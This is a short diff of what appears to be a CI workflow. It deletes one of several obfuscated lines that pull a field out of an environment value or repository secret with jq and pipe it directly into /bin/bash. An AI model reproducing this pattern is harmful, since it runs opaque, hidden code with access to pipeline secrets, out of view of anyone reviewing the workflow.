@@ -22,7 +22,6 @@ jobs:
           xcfvi3367: ${{ secrets.xcfvi3367 }}
         run: |
           printf '%s' "$xcfvi3367" | jq -r .k7 | /bin/bash
-          echo $shew6498 | jq -r .ohc19277 | /bin/bash
           echo $ueg3686 | jq -r .k0379 | /bin/bash
           echo $qlwiq7 | jq -r .uldk8 | /bin/bash
 
